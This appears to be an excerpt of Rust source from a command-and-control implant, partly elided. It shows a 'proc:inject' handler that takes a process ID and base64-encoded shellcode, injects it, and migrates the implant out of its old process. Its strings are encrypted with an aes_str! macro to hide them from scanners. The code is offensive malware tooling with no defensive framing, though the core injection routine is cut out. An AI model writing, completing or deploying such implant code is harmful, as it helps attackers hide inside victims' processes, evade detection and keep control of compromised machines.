...
pub async fn handle_injection(cmd: String) -> (String, String, i32) {
    ...
    if parts.len() != 3 {
        return (String::new(), aes_str!("Usage: proc:inject <pid> <base64_shellcode>"), 1);
    }
    let (pid, shellcode) = match (parts[1].parse::<u32>(), BASE64.decode(&parts[2])) {
        (Ok(p), Ok(s)) => (p, s),
        (Err(_), _) => return (String::new(), format!("{}: {}", aes_str!("Invalid PID"), parts[1]), 1),
        ...
        async move {
            ...
            match result {
                Ok(msg) => {
                    ...
                    sink.send_chunk(&aes_str!("[*] Migration successful. Exiting old process in 5s...")).await;
